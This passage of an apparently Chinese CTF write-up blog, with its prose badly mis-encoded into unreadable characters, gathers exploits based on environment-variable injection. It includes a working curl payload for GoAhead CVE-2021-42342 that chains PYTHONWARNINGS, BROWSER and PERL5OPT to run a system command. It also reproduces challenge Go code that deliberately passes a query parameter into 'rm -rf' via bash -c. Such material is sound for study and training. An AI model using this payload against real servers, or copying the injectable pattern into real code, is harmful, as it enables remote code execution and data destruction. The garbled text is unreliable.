&lt;/code>&lt;/pre>&lt;p>è¿™ä¸ªå±äºæ ¼å±€æ‰“å¼€ï¼Œä¸å±€é™äºåŠ«æŒæŸä¸ªå‡½æ•°ï¼Œè€Œæ˜¯é€šè¿‡preloadæ‹¦æˆªå¯åŠ¨è¿›ç¨‹&lt;/p>
&lt;h2 id="in-ctf">in CTF&lt;/h2>
&lt;h3 id="plaidctf-2021">[PlaidCTF 2021]&lt;/h3>
&lt;p>&lt;a href="https://luker983.github.io/blog/2021-04-26-Embedded-Webserver-Null-Byte-Injection/">wp&lt;/a>&lt;/p>
&lt;h3 id="pbctf-2021advancement">[pbCTF 2021]Advancement&lt;/h3>
&lt;p>&lt;a href="https://articles.zsxq.com/id_xipxbpei4eti.html">wp&lt;/a> | &lt;a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">wp2&lt;/a> | &lt;a href="https://www.elttam.com/blog/env/">HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters&lt;/a>&lt;/p>
&lt;p>æ˜¯GoAheadæ¡†æ¶ï¼Œåœ¨route.txtä¸­å¢åŠ cgiè·¯ç”±&lt;/p>
&lt;pre tabindex="0">&lt;code>route uri=/cgi-bin handler=cgi
route uri=/ redirect=/cgi-bin/date handler=redirect
&lt;/code>&lt;/pre>&lt;p>ä»¥åŠ/cgi-binä¸‹çš„cgiè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">datetime&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">date&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type: text/plain&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">today&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">date&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">today&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today&amp;#39;s date:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">today&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œç”±GoAheadçš„cveæˆ‘ä»¬çŸ¥é“ï¼ˆä½†å¥½åƒè¿™ä¸ªé¢˜åœ¨å½“æ—¶æ˜¯dayé¢˜ æ²¡æœ‰å…¬å¼€çš„cve-2021-42342 è€Œè¿™é‡Œç”¨çš„å°±æ˜¯è¿™ä¸ªï¼‰ï¼Œä¸Šä¼ è¡¨å•é”®å€¼å¯¹å¯ä»¥å†™å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨PYTHONWARNINGSç¯å¢ƒå˜é‡å¼•å…¥å…¶å®ƒæ¨¡å—ï¼Œå†é€šè¿‡antigravityæ¨¡å—å¯¹äºbrowserç¯å¢ƒå˜é‡å¯åŠ¨å“åº”çš„è¿›ç¨‹ï¼Œé…åˆperl+PERL5OPTç¯å¢ƒå˜é‡è¿›è¡Œrceï¼ˆæ›´å¤šå†…å®¹å‚è§ä¸Šé¢çš„æ–‡ç« &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -F &lt;span style="color:#d88200">&amp;#34;PYTHONWARNINGS=all:0:antigravity.x:0:0&amp;#34;&lt;/span> -F &lt;span style="color:#d88200">&amp;#34;BROWSER=perlthanks&amp;#34;&lt;/span> -F &lt;span style="color:#d88200">&amp;#39;PERL5OPT=-Mbase;print(system(&amp;#34;cat&amp;#34;.chr(0x20).&amp;#34;/flag&amp;#34;));exit;&amp;#39;&lt;/span> http://advancement.chal.perfect.blue
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”pç‰›åœ¨vulhubä¸­ç»™å‡ºçš„pocç”¨çš„æ˜¯LD_PRELOADï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®çš„ç›¸å…³ç›®å½•/etc/goahead/tmpæ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥æ— æ³•æ„é€ ä¸Šä¼ è¡¨å•ä¼ .so&lt;/p>
&lt;h3 id="æ¹–æ¹˜æ¯2021-çº¿ä¸‹multistageagency">[æ¹–æ¹˜æ¯2021 çº¿ä¸‹]MultistageAgency&lt;/h3>
&lt;p>&lt;a href="https://ha1c9on.top/?p=1913">wp1&lt;/a> | &lt;a href="https://guokeya.github.io/post/ZqfbSBz7J/">wp2&lt;/a>&lt;/p>
&lt;p>æœ‰proxyå’Œwebä¸¤ä¸ªwebç”¨æˆ·èµ·çš„æœåŠ¡ï¼Œserverç”±rootèµ·&lt;/p>
&lt;p>proxyåœ¨å†…ç½‘çš„8080ç«¯å£ï¼Œä¸»è¦æä¾›è¿”å›&lt;code>Secretkey&lt;/code>çš„åŠŸèƒ½&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/elazarl/goproxy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// è¯»å–å½“å‰ç›®å½•ä¸‹çš„key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">goproxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProxyHttpServer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Verbose&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">OnRequest&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">DoFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">goproxy&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ProxyCtx&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Secretkey&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">SecretKey&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// è¿”å›åŒ…çš„è¯·æ±‚å¤´è®¾ç½®Secretkey
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 8080&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">proxy&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>9091ç«¯å£serverï¼Œæœ‰å‘½ä»¤æ³¨å…¥ç‚¹/manageå’Œä¸€ä¸ªwafï¼Œå¹¶ä¸”éœ€è¦æœ¬åœ°ipè®¿é—®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/md5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os/exec&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unicode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æ£€æŸ¥æ¥æºipä¸ºæœ¬åœ°æ‰ç»§ç»­æ‰§è¡Œ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">header&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sks&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;Secretkey&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sks&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">sks&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fromHosts&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;Fromhost&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHosts&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHosts&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sk&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">has&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">manage&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">m&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// getæ–¹å¼ä¼ å…¥må‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">!&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">m&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;waf!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">cmd&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rm -rf uploads/%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">m&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// åˆ é™¤uploads/{m}ä¸‹æ‰€æœ‰å†…å®¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// å‘½ä»¤æ³¨å…¥ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outerr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
